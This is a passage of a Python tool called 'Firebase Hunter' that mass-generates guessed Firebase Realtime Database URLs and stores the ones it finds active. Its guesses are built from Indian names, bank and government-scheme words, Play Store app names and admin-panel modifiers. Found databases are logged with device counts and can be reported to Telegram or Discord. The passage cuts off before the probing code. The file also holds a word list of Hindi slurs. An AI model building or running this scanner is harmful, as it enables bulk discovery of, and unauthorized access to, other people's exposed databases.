#!/usr/bin/env python3
"""
Firebase Hunter v7.0 — LEGACY-ONLY, SEED-FIRST REAL FINDER
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
URL format (ONLY):  https://[project_id]-default-rtdb.firebaseio.com
No regional .firebasedatabase.app. No bare .firebaseio.com.

Modes:
  python run.py                         # serve (default)
  python run.py harvest [flags]         # Play Store name harvester
  python run.py verify [N]              # seed vs generator hit rate
  python run.py verify-playstore [N]    # playstore vs generator hit rate

Reality:
  Random guessing = 0 hits. Mathematical fact.
  Seed expansion = 0.5-3% hit rate. Real projects have sibling projects.
  Play Store names = 0.3-1%. Some apps use Firebase RTDB.
  APK google-services.json = ~100% real IDs (separate tool needed).

Project ID rules (official):
  6-30 chars, lowercase letters/digits/hyphens,
  starts with letter, no trailing hyphen,
  cannot contain 'google', 'null', 'undefined', 'ssl'.
"""
from __future__ import annotations
import argparse
import http.client
import json
import os
import random
import re
import secrets
import sqlite3
import sys
import threading
import time
from concurrent.futures import ThreadPoolExecutor, as_completed
from datetime import datetime, timezone
from http.server import BaseHTTPRequestHandler, ThreadingHTTPServer
from pathlib import Path
from urllib.parse import urlparse, parse_qsl, urlencode, quote_plus
from urllib.request import Request, urlopen
from urllib.error import URLError, HTTPError

import requests


# ═══════════════════════════════════════════════════════════════
#  CONFIG
# ═══════════════════════════════════════════════════════════════
BASE = Path(__file__).resolve().parent
DATA = BASE / "data"
DATA.mkdir(exist_ok=True)
DB = DATA / "bulk.sqlite3"
ACTIVE_FILE = DATA / "active.txt"
VERIFIED_FILE = DATA / "valid.txt"
PLAY_JSON = DATA / "playstore_names.json"
PLAY_TXT = DATA / "playstore_names.txt"

HOST = os.getenv("HOST", "0.0.0.0")
PORT = int(os.getenv("PORT", "8080"))
WORKERS = max(1, min(128, int(os.getenv("BULK_WORKERS", "32"))))
MAX_URLS = max(1, int(os.getenv("BULK_MAX_URLS", "100000")))
MAX_BYTES = max(4096, int(os.getenv("BULK_MAX_BYTES", "10485760")))
TIMEOUT = max(2, min(30, int(os.getenv("BULK_TIMEOUT", "6"))))
MAX_PROBE = 64 * 1024
RATE_WINDOW = 60
RATE_LIMIT = int(os.getenv("BULK_RATE_LIMIT", "10000"))
RATE: dict = {}
RATE_LOCK = threading.Lock()
STOP = threading.Event()
LOG_LOCK = threading.Lock()
GEN_LOCK = threading.Lock()

AUTO_MAX_URLS = max(100, int(os.getenv("BULK_AUTO_MAX_URLS", "10000000")))
AUTO_BATCH = max(50, min(10000, int(os.getenv("BULK_AUTO_BATCH", "500"))))
AUTO_EXPAND = os.getenv("BULK_AUTO_EXPAND", "1") == "1"
VERIFY_DEVICES = os.getenv("BULK_VERIFY", "1") == "1"

FIREBASE_DEFAULT_KEY = os.getenv("FIREBASE_DEFAULT_KEY", "12")
VERIFY_TIMEOUT = 10
VERIFY_KEYS = [FIREBASE_DEFAULT_KEY, "", None]

TELEGRAM_BOT_TOKEN = os.getenv("TELEGRAM_BOT_TOKEN", "").strip()
TELEGRAM_CHAT_ID = os.getenv("TELEGRAM_CHAT_ID", "").strip()
DISCORD_WEBHOOK = os.getenv("DISCORD_WEBHOOK", "").strip()
PUBLIC_BASE_URL = (os.getenv("PUBLIC_BASE_URL") or os.getenv("RENDER_EXTERNAL_URL") or "").strip().rstrip("/")
TELEGRAM_ENABLED = bool(TELEGRAM_BOT_TOKEN and TELEGRAM_CHAT_ID)
DISCORD_ENABLED = bool(DISCORD_WEBHOOK)
FILE_INTERVAL = int(os.getenv("FILE_INTERVAL_MIN", "15")) * 60

ACTIVE_URLS: set = set()
VERIFIED_URLS: set = set()
ACTIVE_LOCK = threading.Lock()
VERIFIED_LOCK = threading.Lock()
_TLS = threading.local()

PROJECT_ID_RE = re.compile(r"^[a-z][a-z0-9-]{4,28}[a-z0-9]$")
RE_LEGACY_HOST = re.compile(r"^[a-z0-9][a-z0-9-]*\.firebaseio\.com$", re.I)
RESTRICTED_SUBSTRINGS = ("google", "null", "undefined", "ssl")


# ═══════════════════════════════════════════════════════════════
#  PLAY STORE NAME LOADER
# ═══════════════════════════════════════════════════════════════
def _load_play_names() -> list:
    if PLAY_JSON.exists():
        try:
            data = json.loads(PLAY_JSON.read_text(encoding="utf-8"))
            if isinstance(data, dict) and data:
                items = sorted(
                    ((k, int(v)) for k, v in data.items()
                     if isinstance(k, str) and k),
                    key=lambda kv: (-kv[1], kv[0]),
                )
                return [k for k, _ in items]
        except Exception:
            pass
    if PLAY_TXT.exists():
        try:
            return [line.strip() for line in
                    PLAY_TXT.read_text(encoding="utf-8").splitlines()
                    if line.strip()]
        except Exception:
            pass
    return []


PLAY_NAMES: list = _load_play_names()


# ═══════════════════════════════════════════════════════════════
#  POOLS
# ═══════════════════════════════════════════════════════════════
NAMES_M = """
raj rahul sanjay ramesh sonu manish karan amit suman rohit arvind deepak
sivam ajay shivam navin pintu krisna sumit anvith yogesh ram ravi shiva
raja arjun vikram abhishek aman anil ankit ashok balaji bhavesh chetan
dinesh ganesh gaurav gopal hari harish hemant jagdish kamal kishor kumar
lalit madan mahesh mohan mukesh naresh nikhil nilesh nitin omkar pankaj
prakash prasad praveen prem rajat rakesh ranjan rohan sachin sahil
sameer sandeep santosh satish saurabh shreyas siddharth sudhir suresh
surya tarun uday umesh varun vijay vinod vipin vishal vivek yash yuvraj
aditya akshay arnav atharva bhargav darsh dhanush dhruv harsh hitesh
jayesh kalpesh kartik kaushik krishna lokesh nandan nayan nishant nitish
parth pranav pratik rishi ritik sahith sai samarth shlok shubham sid
soham srikant sriram suraj tej tanmay tushar utkarsh vedant vihaan
vineet vinay virat vishnu zaid ansh bhavya chirag dev divyansh faizan
farhan gagan gurpreet hemanshu ishaan jai jaspreet kabir kailash
manav mihir mohit naman neeraj ojas om pandit parag prithvi raghav
rishabh rudra saarthak samay shashank shivansh shourya siddhesh sooraj
srikar tanay tejas tirth vaibhav ved vyom yashwant
""".split()

NAMES_F = """
priya pooja khushi anjali siya kavya riya neha sneha ritu sita geeta
meera radha lakshmi sunita kavita nisha shilpa shweta tanvi tara trisha
vidya yamini zara aditi aishwarya amrita ananya anisha asha bhavna chitra
deepa divya ekta gauri gayatri hema indira ishita jaya jyoti kalpana
kiran komal kripa lata madhu madhuri mala manisha meena naina namrata
nandini nayana neelam nidhi nirmala pallavi parul payal pragya pratibha
preeti priyanka pushpa radhika rani rashmi reena rekha renuka reshma
rina ruchi rupali sadhana sangeeta sarita savita seema shanti sheela
shobha shraddha shruti sindhu smita sonal sonia sridevi sudha sujata
sunanda supriya swati tanuja uma urmila usha vaishali vandana varsha
veena vimala vinita yashodha ahana alisha amaira anika arushi avni
dhriti diya hetvi ira ishani jhanvi kaira kiara kritika kushi mahika
myra naisha navya netra pari piya saanvi sara saumya shreya tanya trixi
vedika zoya aaradhya akansha alka amala anita aparna archana bharti
bhumi chandni chhaya damini darshana devika dhanvi esha falguni gargi
gitanjali guddi harshita hemangi jagruti janvi jasmine kalindi kamini
karishma kashish kumkum lakshita lalita lavanya leela madhavi mahima
megha mohini mridula mukta nalini namita narmada neelima nikita nirali
nivedita padma palak pankti paridhi pinal poonam prerna priti punam
rachna ragini rajni rashi ratri roma roshni rupal rutvi sachi sagarika
sakshi samiksha saniya saroj shalini shanta sharda shashi sheetal
shubhi simran sonam srishti stuti sudiksha suhani sumitra sunaina
swara sweta tanisha tanu tarini trupti tvisha udita urja vaidehi vani
vidhi vijaya vipasha vishakha yashasvi yukti zarna
""".split()

SURNAMES = """
sharma verma gupta agarwal jain singh kumar yadav rao reddy naidu
patel shah mehta desai iyer iyengar pillai nair menon chowdhury
banerjee mukherjee chatterjee bose das dutta ghosh sen roy
khan ali syed sheikh ansari qureshi pathan mirza
kaur ahluwalia grewal sandhu dhillon gill sidhu brar bajwa
joshi trivedi pandey mishra tiwari dubey shukla chaturvedi saxena
srivastava bhattacharya mahajan kapoor khanna malhotra chopra
sethi arora bedi bhalla ahuja sachdeva
""".split()

BANKS = """
sbi hdfc icici axis kotak pnb bob boi uco canara union indian idbi
yes federal rbl bandhan idfc au ujjivan equitas indusind dcb
cbi central bankofindia bankofbaroda punjab national overseas
syndicate corporation andhra vijaya dena allahabad oriental
paytm phonepe gpay googlepay bhim freecharge mobikwik
""".split()

GOVT_SCHEMES = """
pmkisan kisan kisan-samman rto upi aadhaar pan ration mgnrega
pmay ayushman jan-dhan mudra pmjay pmfby pm-svanidhi pm-vishwakarma
pm-awas yojana scheme sarkari sarkar govt government indian
e-shram eshram ekyc kyc e-mitra emitra csc janseva e-seva
passport voter election result admit-card result-exam
scholarship pension pradhan-mantri pradhanmantri
pmkisan-samman-man-dhan kisan-credit-card
fasal-bima jeevan-jyoti jeevan-bima atal-pension sukanya-samriddhi
""".split()

PUBLIC_SERVICE = """
hospital clinic medical health pharmacy medicine doctor patient
school college university coaching tuition exam result admission
panchayat gram nagar-palika municipal corporation ward
police thana kotwali court kachehri collector tehsil tahsildar
patwari lekhpal bdo dm sdm sdo
railway irctc train bus transport roadways rto transport
electricity bijli power water jal gas lpg
""".split()

PORTAL_WORDS = """
panel portal dashboard admin backend service office department
ministry scheme yojana mission abhiyan program project
india bharat bhartiya desi jai-hind vande-mataram
new purana naya latest official real genuine verified
online digital smart e-cyber tech
""".split()

RELATIONAL = """
bhai bhaiya bhabhi didi babu baba chacha mama mami papa mummy beta
beti devar nanad sasur saas nani nana dadi dada chotu monu golu
chintu bablu raju kaka kaki mausa mausi fufa bua deewana yaar dost
behan maa baap ghar parivar khandan sansar
""".split()

HINGLISH = """
mera tera hamara tumhara apna pehla pehle aakhri naya nayi purana
sach jhoot dosti pyar mohabbat rishta khush gham sapna kal aaj subhu
raat din saal mahina sarkar kisan kheti gaadi rickshaw rto upi paytm
khata paisa rupay sikka seth baniya dukaan bazaar mandi sabzi chai
samosa pakoda lassi thali biryani kebab paratha roti dal khana peena
shuruwat kitter lodaroll yohichahiye rahais singhaana gooodhua pessa
flashow jpicku pokemon raaz rahasya jadu tantra mantra shakti veer
sher baaz baaghi masti mast gunda goli dada don king queen boss
raja rani shahzada shahzadi nawab badshah wazir sipahi fauji
""".split()

LOVE = """
love pyar ishq mohabbat dosti breakup broken heart dil dilbar dildaar
jaan jaanu jaaneman sanam mehboob mehbooba aashiq aashiqui deewana
deewani pagal paagal yaari judaai milan intezaar forever alone akela
akeli tanha tanhai khushi gham dard rona ansu aansu missyou loveyou
iloveyou loveu sad happy cutie sweetie baby babu shona sona sweety
cutiepie kiss hug chahat aarzoo tamanna khwahish hasrat dhadkan saath
wafa bewafa
""".split()

GAALI = """
chutiyapa chutiyagiri chutkabaal chutmarani bhosdi bhosdike bhosdiwala
bhenchod bhencho bhenchood madarchod madarchood mc bc bkl chodu
chutiye chutiyon gaand gandu gandfat randi randi-ka randi-ka-bachcha
lund lauda lode laund laude lauda-lele tera-maa tera-baap
behen-ke gaandu chakka hijra khusra kinnar
lodu lodugiri lode-laga dogla doglapan dogle kutta kutiya
kutta-kamina kamina kamine harami haramkhor haramzada
saala saali saale sale-kutta badtameez badmaash badmash
""".split()

ENGLISH = """
app test demo chat user data shop blog game hotel food cafe store
site note todo task list quick smart fast easy cool nice good best
dev prod beta alpha core main team work home office school college
study music video photo book foodie kart pay money cash wallet loan
bill tax hospital clinic doctor pharmacy restaurant market mall
travel flight train bus cab auto yatra trip tour package booking
ticket payment transfer recharge billpay invest credit debit
savings spy clone strange vibe download sorry spirit flash engine
power union axis reliable cogulent privatesok yellow green
dream hope faith truth lie light dark night day sun moon star sky
sea ocean river mountain fire water earth wind storm rain snow
""".split()

CELEB = """
rohit virat sachin dhoni kohli dhawan bumrah hardik salman aamir
shahrukh srk akshay ajay hrithik ranbir ranveer deepika katrina
priyanka anushka alia kareena kangana jacqueline modi rahul-gandhi
kejriwal amit-shah yogi mamata nitish laloo heisenberg jamesbond
pablo pablo-escobar don vito michael tommy batman superman spiderman
ironman thor hulk captain-america flash arrow naruto sasuke itachi
kakashi luffy zoro goku vegeta pokemon pikachu krishna krish arjun
karna bhishma drona duryodhan veerappan manikarnika shivaji
maharana-pratap tipu-sultan akbar babur humayun shah-jahan aurangzeb
maradona messi ronaldo neymar mbappe beckham pele
""".split()

FIR_AUTOGEN = ["fir", "my-first-project", "first-project", "firebase-app",
               "firebase-demo", "my-app", "my-project", "project-1", "untitled"]

HEX5 = "0123456789abcdef"
KEYBOARD_ROWS = ["qwertyuiop", "asdfghjkl", "zxcvbnm"]
KEYBOARD_ALL = "asdfghjklqwertyuiopzxcvbnm1234567890"
LEET_MAP = str.maketrans({"a": "4", "e": "3", "i": "1", "o": "0", "s": "5"})
MODIFIERS = ["admin", "panel", "pannel", "penal", "dash", "dashboard",
             "backend", "manager", "owner", "super", "mega", "ultra",
             "plus", "pro", "premium", "vip", "gold", "silver", "king",
             "queen", "master", "boss", "god", "root", "base", "core",
             "temp", "tmp", "old", "new", "real", "original", "clone",
             "copy", "official", "private", "main"]
SECOND_PROJECT_MODS = ["admin", "panel", "pannel", "new", "official",
                       "app", "pro", "v2", "main", "real", "original"]
YEARS = ["2018", "2019", "2020", "2021", "2022", "2023", "2024",
         "2025", "2026", "2027"]

_ALL_NAMES = NAMES_M + NAMES_F
_SECTOR = BANKS + GOVT_SCHEMES + PUBLIC_SERVICE + PORTAL_WORDS


# ═══════════════════════════════════════════════════════════════
#  SCHEMA
# ═══════════════════════════════════════════════════════════════
SCHEMA = """
CREATE TABLE IF NOT EXISTS jobs (
 id INTEGER PRIMARY KEY AUTOINCREMENT,
 token TEXT UNIQUE NOT NULL,
 filename TEXT NOT NULL,
 total INTEGER NOT NULL,
 processed INTEGER NOT NULL DEFAULT 0,
 active INTEGER NOT NULL DEFAULT 0,
 inactive INTEGER NOT NULL DEFAULT 0,
 no_data INTEGER NOT NULL DEFAULT 0,
 unreachable INTEGER NOT NULL DEFAULT 0,
 too_large INTEGER NOT NULL DEFAULT 0,
 status TEXT NOT NULL DEFAULT 'pending',
 error TEXT,
 job_type TEXT NOT NULL DEFAULT 'manual',
 seeds TEXT,
 created_at TEXT NOT NULL DEFAULT CURRENT_TIMESTAMP,
 started_at TEXT,
 completed_at TEXT,
 updated_at TEXT NOT NULL DEFAULT CURRENT_TIMESTAMP
);
CREATE TABLE IF NOT EXISTS items (
 id INTEGER PRIMARY KEY AUTOINCREMENT,
 job_id INTEGER NOT NULL,
 url TEXT NOT NULL,
 status TEXT NOT NULL DEFAULT 'pending',
 http_status INTEGER,
 error TEXT,
 latency_ms INTEGER,
 checked_at TEXT,
 FOREIGN KEY(job_id) REFERENCES jobs(id) ON DELETE CASCADE
);
CREATE INDEX IF NOT EXISTS idx_items_pending ON items(job_id,status,id);
CREATE INDEX IF NOT EXISTS idx_items_active ON items(job_id,status);
CREATE INDEX IF NOT EXISTS idx_jobs_status ON jobs(status,id);

CREATE TABLE IF NOT EXISTS active_urls (
 id INTEGER PRIMARY KEY AUTOINCREMENT,
 url TEXT UNIQUE NOT NULL,
 first_seen_at TEXT NOT NULL DEFAULT CURRENT_TIMESTAMP,
 last_seen_at TEXT NOT NULL DEFAULT CURRENT_TIMESTAMP,
 source_job_id INTEGER,
 http_status INTEGER,
 latency_ms INTEGER,
 device_count INTEGER DEFAULT -1
);
CREATE INDEX IF NOT EXISTS idx_active_urls_url ON active_urls(url);

CREATE TABLE IF NOT EXISTS verified_urls (
 id INTEGER PRIMARY KEY AUTOINCREMENT,
 url TEXT UNIQUE NOT NULL,
 first_seen_at TEXT NOT NULL DEFAULT CURRENT_TIMESTAMP,
 last_seen_at TEXT NOT NULL DEFAULT CURRENT_TIMESTAMP,
 source_job_id INTEGER,
 device_count INTEGER DEFAULT 0,
 http_status INTEGER,
 latency_ms INTEGER
);
CREATE INDEX IF NOT EXISTS idx_verified_urls_url ON verified_urls(url);

CREATE TABLE IF NOT EXISTS seed_stats (
 seed TEXT PRIMARY KEY,
 attempts INTEGER NOT NULL DEFAULT 0,
 active INTEGER NOT NULL DEFAULT 0,
 last_hit_at TEXT,
 first_seen_at TEXT NOT NULL DEFAULT CURRENT_TIMESTAMP
);
CREATE INDEX IF NOT EXISTS idx_seed_stats_rate ON seed_stats(active, attempts);
"""


# ═══════════════════════════════════════════════════════════════
#  UTILITIES
# ═══════════════════════════════════════════════════════════════
def log(msg: str):
    with LOG_LOCK:
        ts = datetime.now().strftime("%H:%M:%S")
        print(f"[{ts}] {msg}", flush=True)


def now() -> str:
    return datetime.now(timezone.utc).isoformat(timespec="seconds")


def elapsed_seconds(started_at, ended_at=None) -> int:
    if not started_at:
        return 0
    try:
        s = datetime.fromisoformat(started_at.replace("Z", "+00:00"))
    except Exception:
        return 0
    if ended_at:
        try:
            e = datetime.fromisoformat(ended_at.replace("Z", "+00:00"))
        except Exception:
            e = datetime.now(timezone.utc)
    else:
        e = datetime.now(timezone.utc)
    if s.tzinfo is None: s = s.replace(tzinfo=timezone.utc)
    if e.tzinfo is None: e = e.replace(tzinfo=timezone.utc)
    return max(0, int((e - s).total_seconds()))


def db():
    c = sqlite3.connect(DB, timeout=60, isolation_level=None)
    c.row_factory = sqlite3.Row
    c.execute("PRAGMA journal_mode=WAL")
    c.execute("PRAGMA synchronous=NORMAL")
    c.execute("PRAGMA foreign_keys=ON")
    c.execute("PRAGMA busy_timeout=60000")
    return c


def init_db():
    c = db()
    c.executescript(SCHEMA)
    cols = {r["name"] for r in c.execute("PRAGMA table_info(jobs)").fetchall()}
    if "job_type" not in cols:
        try: c.execute("ALTER TABLE jobs ADD COLUMN job_type TEXT NOT NULL DEFAULT 'manual'")
        except sqlite3.OperationalError: pass
    if "seeds" not in cols:
        try: c.execute("ALTER TABLE jobs ADD COLUMN seeds TEXT")
        except sqlite3.OperationalError: pass
    c.execute("UPDATE jobs SET status='pending', started_at=NULL "
              "WHERE status='processing' AND job_type='manual'")
    c.execute("UPDATE jobs SET status='stopped' "
              "WHERE status='processing' AND job_type IN ('auto','auto-random')")
    c.close()


# ═══════════════════════════════════════════════════════════════
#  PERSISTENCE
# ═══════════════════════════════════════════════════════════════
def atomic_write_file(path: Path, lines: list):
    try:
        tmp = path.with_suffix(path.suffix + ".tmp")
        with open(tmp, "w", encoding="utf-8") as f:
            f.write("\n".join(lines) + ("\n" if lines else ""))
            f.flush()
            os.fsync(f.fileno())
        os.replace(tmp, path)
    except Exception as e:
        log(f"atomic_write_file error: {e}")


def load_all_persistent():
    try:
        c = db()
        arows = c.execute("SELECT url FROM active_urls ORDER BY id").fetchall()
        vrows = c.execute("SELECT url FROM verified_urls ORDER BY id").fetchall()
        c.close()
        with ACTIVE_LOCK: ACTIVE_URLS.update(r["url"] for r in arows)
        with VERIFIED_LOCK: VERIFIED_URLS.update(r["url"] for r in vrows)
    except Exception as e:
        log(f"load DB error: {e}")

    for fpath, target, lock in [
        (ACTIVE_FILE, ACTIVE_URLS, ACTIVE_LOCK),
        (VERIFIED_FILE, VERIFIED_URLS, VERIFIED_LOCK),
    ]:
        if fpath.exists():
            try:
                with open(fpath, "r", encoding="utf-8") as f:
                    urls = [line.strip() for line in f if line.strip()]
                with lock: target.update(urls)
            except Exception as e:
                log(f"load {fpath.name} error: {e}")

    log(f"📦 Loaded {len(ACTIVE_URLS)} active, {len(VERIFIED_URLS)} verified")


def persist_active(url, source_job_id=None, http_status=None, latency_ms=None):
    url = str(url).strip().rstrip("/")
    if not url: return False
    with ACTIVE_LOCK:
        if url in ACTIVE_URLS:
            try:
                c = db()
                c.execute("UPDATE active_urls SET last_seen_at=?, source_job_id=? "
                          "WHERE url=?", (now(), source_job_id, url))
                c.close()
            except Exception: pass
            return False
        try:
            c = db()
            c.execute("INSERT OR IGNORE INTO active_urls"
                      "(url,last_seen_at,source_job_id,http_status,latency_ms) "
                      "VALUES(?,?,?,?,?)",
                      (url, now(), source_job_id, http_status, latency_ms))
            inserted = c.total_changes == 1
            c.close()
        except Exception as e:
            log(f"persist_active error: {e}"); return False
        if not inserted:
            ACTIVE_URLS.add(url); return False
        ACTIVE_URLS.add(url)
    try:
        with open(ACTIVE_FILE, "a", encoding="utf-8") as f:
            f.write(url + "\n")
    except Exception as e:
        log(f"active.txt write error: {e}")
    return True


def persist_verified(url, source_job_id=None, device_count=0,
                     http_status=None, latency_ms=None):
    url = str(url).strip().rstrip("/")
    if not url: return False
    with VERIFIED_LOCK:
        if url in VERIFIED_URLS:
            try:
                c = db()
                c.execute("UPDATE verified_urls SET last_seen_at=?, source_job_id=?, "
                          "device_count=MAX(device_count,?) WHERE url=?",
                          (now(), source_job_id, device_count, url))
                c.close()
            except Exception: pass
            return False
        try:
            c = db()
            c.execute("INSERT OR IGNORE INTO verified_urls"
                      "(url,last_seen_at,source_job_id,device_count,http_status,latency_ms) "
                      "VALUES(?,?,?,?,?,?)",
                      (url, now(), source_job_id, device_count, http_status, latency_ms))
            inserted = c.total_changes == 1
            c.close()
        except Exception as e:
            log(f"persist_verified error: {e}"); return False
        if not inserted:
            VERIFIED_URLS.add(url); return False
        VERIFIED_URLS.add(url)
    try:
        with open(VERIFIED_FILE, "a", encoding="utf-8") as f:
            f.write(url + "\n")
    except Exception as e:
        log(f"valid.txt write error: {e}")
    return True


def save_all_files():
    with ACTIVE_LOCK: atomic_write_file(ACTIVE_FILE, sorted(ACTIVE_URLS))
    with VERIFIED_LOCK: atomic_write_file(VERIFIED_FILE, sorted(VERIFIED_URLS))


# ═══════════════════════════════════════════════════════════════
#  SEED STATS
# ═══════════════════════════════════════════════════════════════
def record_seed_attempt(seed: str, is_active: bool):
    if not seed: return
    seed = seed.strip().lower()[:60]
    try:
        c = db()
        c.execute("INSERT INTO seed_stats(seed, attempts, active) VALUES(?, 1, ?) "
                  "ON CONFLICT(seed) DO UPDATE SET "
                  "attempts = attempts + 1, active = active + ?, "
                  "last_hit_at = CASE WHEN ? = 1 THEN ? ELSE last_hit_at END",
                  (seed, 1 if is_active else 0, 1 if is_active else 0,
                   1 if is_active else 0, now()))
        c.close()
    except Exception as e:
        log(f"record_seed_attempt error: {e}")


def get_top_seeds(limit=50):
    c = db()
    rows = c.execute(
        "SELECT seed, attempts, active, "
        "ROUND(CAST(active AS FLOAT) / MAX(attempts,1) * 100, 2) AS rate "
        "FROM seed_stats WHERE attempts >= 3 "
        "ORDER BY rate DESC, active DESC LIMIT ?", (limit,)).fetchall()
    c.close()
    return [dict(r) for r in rows]


# ═══════════════════════════════════════════════════════════════
#  VALIDATION — LEGACY ONLY
# ═══════════════════════════════════════════════════════════════
def validate_project_id(pid: str) -> bool:
    """
    Official Firebase/GCP rules:
      6-30 chars, lowercase letters/digits/hyphens,
      starts with letter, no trailing hyphen,
      no restricted substrings (google, null, undefined, ssl).
    """
    if not pid or not isinstance(pid, str):
        return False
    pid = pid.strip().lower()
    if len(pid) < 6 or len(pid) > 30:
        return False
    if not pid[0].isalpha() or not pid[0].islower():
        return False
    if pid.endswith("-") or "--" in pid:
        return False
    for bad in RESTRICTED_SUBSTRINGS:
        if bad in pid:
            return False
    return bool(PROJECT_ID_RE.match(pid))


def canonical_host(host: str):
    """Accept ONLY legacy .firebaseio.com hosts. Reject regional."""
    if not host:
        return None
    host = host.lower().rstrip(".")
    if RE_LEGACY_HOST.match(host):
        return host
    return None


def host_to_project(host: str):
    """Extract project_id from legacy host only."""
    host = host.lower().rstrip(".")
    if not host.endswith(".firebaseio.com"):
        return None
    base = host[:-len(".firebaseio.com")]
    if base.endswith("-default-rtdb"):
        base = base[:-len("-default-rtdb")]
    return base if validate_project_id(base) else None


def canonical_url(raw: str):
    """Normalize to https://<host>. Reject regional and bare forms."""
    if not raw:
        return None
    raw = raw.strip()
    if not raw or raw.startswith("#"):
        return None
    if not re.match(r"^https?://", raw, re.I):
        raw = "https://" + raw
    raw = re.sub(r"^http://", "https://", raw, flags=re.I)
    try:
        u = urlparse(raw)
    except Exception:
        return None
    if u.username or u.password:
        return None
    canon = canonical_host(u.hostname or "")
    if not canon:
        return None
    return f"https://{canon}"


# ═══════════════════════════════════════════════════════════════
#  PRIMITIVES
# ═══════════════════════════════════════════════════════════════
def _hex5() -> str:
    return "".join(random.choices(HEX5, k=5))


def _num_tail() -> str:
    r = random.random()
    if r < 0.4:
        return f"{random.randint(0, 99):02d}"
    if r < 0.75:
        return str(random.randint(100, 9999))
    return str(random.randint(10000, 999999))


def _keyboard_mash() -> str:
    r = random.random()
    if r < 0.35:
        c = random.choice("abcdefghijklmnopqrstuvwxyz")
        return c * random.randint(4, 12)
    if r < 0.70:
        row = random.choice(KEYBOARD_ROWS)
        return "".join(random.choices(row, k=random.randint(5, 12)))
    return "".join(random.choices(KEYBOARD_ALL, k=random.randint(6, 15)))


def _leetspeak(word: str) -> str:
    return word.translate(LEET_MAP)


def _drop_vowels(word: str) -> str:
    if len(word) <= 4:
        return word
    return word[0] + "".join(c for c in word[1:] if c not in "aeiou")


def _validate(raw: str):
    raw = re.sub(r"[^a-z0-9-]", "", raw.lower())
    raw = re.sub(r"-{2,}", "-", raw).strip("-")
    if not raw or not raw[0].isalpha():
        raw = "u" + raw
    if len(raw) < 6 or len(raw) > 30:
        return None
    return raw if validate_project_id(raw) else None


def _strip_auto_suffix(pid: str) -> str:
    """navin-9fb56 -> navin; navin-2024 -> navin; navin-3 -> navin."""
    for pat in (
        r"^(.+)-[0-9a-f]{5}$",
        r"^(.+)-([0-9]{1,6})$",
        r"^(.+)-(20[0-9]{2})$",
        r"^(.+)-(admin|panel|pannel|penal|official|new|app|pro|v2|main|real|original)$",
        r"^(admin|panel|pannel|penal|official|new|app|pro|v2|main|real|original)-(.+)$",
    ):
        m = re.match(pat, pid)
        if m:
            for g in m.groups():
                if len(g) >= 3:
                    return g
    return pid


# ═══════════════════════════════════════════════════════════════
#  SEED LOADER — reads real bases from valid.txt
# ═══════════════════════════════════════════════════════════════
_SEED_CACHE: list = []
_SEED_CACHE_MTIME: float = -1.0


def _load_seed_bases() -> list:
    """
    Extract human-typed base names from valid.txt.
    Strips -default-rtdb and trailing auto-suffixes (hex5, numeric, year, modifier).
    Cached by mtime.
    """
    global _SEED_CACHE, _SEED_CACHE_MTIME
    if not VERIFIED_FILE.exists():
        return []
    try:
        mtime = VERIFIED_FILE.stat().st_mtime
        if mtime == _SEED_CACHE_MTIME and _SEED_CACHE:
            return _SEED_CACHE
    except Exception:
        pass

    bases = set()
    try:
        for line in VERIFIED_FILE.read_text(encoding="utf-8").splitlines():
            line = line.strip()
            if not line or line.startswith("#"):
                continue
            try:
                host = (urlparse(line if "://" in line else "https://" + line)
                        .hostname or "").lower()
            except Exception:
                continue
            proj = host_to_project(host)
            if not proj:
                continue
            base = _strip_auto_suffix(proj)
            base = re.sub(r"[^a-z0-9-]", "", base.strip("-").lower())
            if 3 <= len(base) <= 28:
                bases.add(base)
    except Exception as e:
        log(f"_load_seed_bases error: {e}")
        return _SEED_CACHE or []

    _SEED_CACHE = sorted(bases)
    _SEED_CACHE_MTIME = mtime if VERIFIED_FILE.exists() else 0.0
    if _SEED_CACHE:
        log(f"🌱 Loaded {len(_SEED_CACHE)} seed bases from valid.txt")
    return _SEED_CACHE


# ═══════════════════════════════════════════════════════════════
#  GENERATOR — seed-first, legacy-only
# ═══════════════════════════════════════════════════════════════
def _pick_base() -> str:
    """
    Real-weight distribution:
      55% seed base from valid.txt (confirmed Firebase user)
      20% Play Store name (real app)
      15% Indian name (real human)
       7% Hinglish / sector
       3% English / other
    """
    seeds = _load_seed_bases()
    r = random.random()

    if r < 0.55 and seeds:
        return random.choice(seeds)

    if r < 0.75 and PLAY_NAMES:
        return random.choice(PLAY_NAMES)

    if r < 0.90:
        return random.choice(_ALL_NAMES)

    if r < 0.97:
        return random.choice(HINGLISH + LOVE + _SECTOR)

    if r < 0.99:
        return random.choice(ENGLISH)

    return _keyboard_mash()


def _apply_suffix(base: str) -> str:
    """
    Real-user suffix patterns:
      40% modifier (admin/panel/new/app/pro/v2/main/real/original/official)
      25% numeric 1-10
      15% year
      10% hex5 (Firebase auto-suggest)
       5% bare
       5% English compound
    """
    r = random.random()

    if r < 0.40:
        mod = random.choice(SECOND_PROJECT_MODS)
        if random.random() < 0.5:
            return f"{mod}-{base}"
        return f"{base}-{mod}"

    if r < 0.65:
        return f"{base}-{random.randint(1, 10)}"

    if r < 0.80:
        return f"{base}-{random.choice(YEARS)}"

    if r < 0.90:
        return f"{base}-{_hex5()}"

    if r < 0.95:
        return base

    return f"{base}-{random.choice(ENGLISH)}"


def generate_project_id() -> str:
    for _ in range(40):
        base = _pick_base()
        r = random.random()
        if r < 0.06:
            base = _leetspeak(base)
        elif r < 0.12:
            base = _drop_vowels(base)
        if random.random() < 0.08:
            base = base + random.choice("abcdxyz123")
        pid = _validate(_apply_suffix(base))
        if pid:
            return pid
    return f"user-{_hex5()}"


def build_firebase_url(project_id: str, region=None) -> str:
    """LEGACY ONLY: https://{project_id}-default-rtdb.firebaseio.com"""
    if not validate_project_id(project_id):
        return None
    return f"https://{project_id}-default-rtdb.firebaseio.com"


def generate_random_batch(job_id, batch_size):
    try:
        c = db()
        existing = {r["url"] for r in c.execute(
            "SELECT url FROM items WHERE job_id=?", (job_id,)).fetchall()}
        c.close()

        new_items, attempts = [], 0
        max_attempts = batch_size * 20
        while len(new_items) < batch_size and attempts < max_attempts:
            attempts += 1
            pid = generate_project_id()
            if not pid:
                continue
            url = build_firebase_url(pid)
            if not url or url in existing:
                continue
            existing.add(url)
            new_items.append((job_id, url))

        if new_items:
            c = db()
            c.executemany("INSERT INTO items(job_id,url) VALUES(?,?)", new_items)
            c.execute("UPDATE jobs SET total=total+?, updated_at=? WHERE id=?",
                      (len(new_items), now(), job_id))
            c.close()
        return len(new_items)
    except Exception as e:
